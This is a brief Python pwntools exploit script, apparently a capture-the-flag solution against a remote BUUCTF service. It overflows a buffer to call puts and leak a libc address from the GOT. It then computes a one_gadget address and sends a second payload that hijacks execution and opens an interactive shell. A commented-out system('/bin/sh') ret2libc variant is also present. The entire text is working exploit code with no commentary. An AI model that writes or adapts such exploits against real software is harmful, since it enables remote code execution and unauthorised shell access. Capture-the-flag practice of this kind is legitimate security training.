from pwn import *

io=remote('node3.buuoj.cn','27671')
puts_plt=0x8048DC0
puts_got=0x804C068
main=0x8049091
pl='I'*16+p32(puts_plt)+p32(main)+p32(puts_got)
io.send(pl)
io.recvuntil('pretty'*16)
io.recv(12)
puts_add=u32(io.recv(4))
print(hex(puts_add))
one_gadget=puts_add-0x05f140+0x5f066
#sys=puts_add-0x24800
#sh=puts_add+0xf9eeb
#pl2='I'*16+p32(sys)+'dead'+p32(sh)
pl2='I'*16+p32(one_gadget)
io.send(pl2)

io.interactive()